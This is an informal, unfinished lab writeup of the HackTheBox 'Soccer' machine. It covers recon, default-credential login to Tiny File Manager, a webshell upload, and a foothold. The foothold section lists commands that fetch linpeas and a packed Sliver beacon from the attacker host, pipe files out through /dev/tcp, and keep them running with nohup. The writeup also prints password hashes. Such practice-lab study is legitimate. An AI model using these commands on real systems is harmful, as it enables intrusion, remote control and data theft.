# Soccer Writeup

Name: Soccer
Date:  13/06/2023
Difficulty:  Easy
Goals:  

Learnt:
- Try harder ... 
Beyond Root
- Research WAF, Nginx
- Use sliver `portfwd` 

Content Discovery - kicking your balls since the [[Bart-Writeup]]. 2022
![](kickingyourballs.png)

The recon for this box was mostly done on a bad day in 28th March  . Over my lunch I facepalmed very as I thought that I might turn this into a Help-Through to go along with my current finish all the CREST machines while I build momentum. Instead I realised the issue very quickly I had given up on a 301 status code out of having a bad day. So I saw up to the login and thought that is just one self humiliation for the road. This box needs to be completed.

I changed all the ttl in this Repository to TTL as I bothered me.
```bash
find . -type f -name *-Writeup.md | xargs -I {} sed -i 's/ttl/TTL/g' {}
```

If I require the any hints or Writeups I will turn this to a Helped-Through my gut feeling is that in maybe 10 or more boxes and a season of ranked I am going to on the path of solving boxes for breakfast. 

## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

I seemed concerned by a WAF and created a reading list for the Beyond root section along with Nginxc 
![](possiblewaf.png)

I found the endpoint I just must have had a bad day or something got in the way.
![](meansredirect.png)

And there is further indication that this is the path as we had an upload. Maybe I looked at gobuster presumed that 301 was off limits but feroxbuster found the 200 because it is recursive. Another nailed again the use and check both argument.  
![](thereisalsoanuploaddirectory.png)

![](300theysay.png)

Unvisited - [heroku](https://elements.heroku.com/buttons/skmdimtiaj/tinyfilemanager) Default username/_password_: _admin_/_admin_@123 and user/12345


![](defaultpassword.png)

![](uploadthewebshelltime.png)

## File upload as Website Admin account

Changing directory to upload to a directory we can write to
![](uploadhere.png)

The better place is full controllable directory and actually changing the permission so that it executes
![](betterplaceisthemonkeyplace.png)

![](404monkeyislanding.png)

## Foothold

With a webshell foothold:
![](monkeylandsinFOOTBALL.png)

Silver for the beyond root...
```go
mtls -L 10.10.14.106 -l 6969
generate beacon --mtls 10.10.14.106:6969 --arch amd64 --os linux --save /home/kali/Soccer/
upx CONFUSED_FIGURINE
```

Commands ran
```bash
# Persistence and automatic exfiltrating recon while i manually enumerate box
mount | grep shm
which curl
cd /dev/shm
curl http://10.10.14.106:8443/linpeas.sh -o linpeas.sh
curl http://10.10.14.106:8443/CONFUSED_FIGURINE -o CONFUSED_FIGURINE
chmod *
nohup bash -c "./linpeas.sh 1> /dev/tcp/10.10.14.106/6996" &
# on kali
# nc -lvnp 6698 > linpeas.out 
nohup ./CONFUSED_FIGURINE &
# Back to the shadow sysadmin
nohup bash -c "cat tinyfilemanager.php > /dev/tcp/10.10.14.106/6996" &
```

From the tiny file manager for the trinkets
`'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123`
`'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345`

There are soc-player.soccer.htb
![](etchosts.png)

and 
![1080](weirdportsonlocalhost.png)



![](playerisnotmuch.png)

## Back to burp

![](morepages.png)

Signing up will grant tickets
![](getthetickets.png)


Created an account called admin1 and signed in as well as use the previous password with the admin account from the first site.
![](webothgetthesameticket.png)
We get the same ticket...
![](somekindofjson.png)

WE are getting web socket messages, which is odd. Nuclei found that we are using express, so node.js RCE ni the json is a possible path. I decided to enumerate to find this soc-player as a directory 

/etc/nginx contains
- sites-available 

![](proxyon3000.png)

[Hacktricks -nginx](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx)


https://github.com/stark0de/nginxpwner has a docker image
```bash
git clone https://github.com/stark0de/nginxpwner
cd nginxpwner
sudo docker build -t nginxpwner:latest .
# Run
sudo docker run -it nginxpwner:latest /bin/bash
```
There is  also [gixy](https://github.com/yandex/gixy), but given Kali 3.X and python and this is also not a maintained Kali package I would recommend the above.

```bash
www-data@soccer:/etc/nginx$ cat nginx.conf > /dev/tcp/10.10.14.106/6996
```

DevOps Cheatsheats!
https://lzone.de/cheat-sheet/nginx


## PrivEsc


## Beyond Root

https://github.com/BishopFox/sliver/wiki/Port-Forwarding

https://www.ibm.com/docs/en/aspera-fasp-proxy/1.4?topic=proxy-forward-firewall-configuration
https://certitude.consulting/blog/en/bypassing-web-application-firewalls/
https://snyk.io/test/docker/nginx%3A1.18.0
https://github.com/lobuhi/byp4xx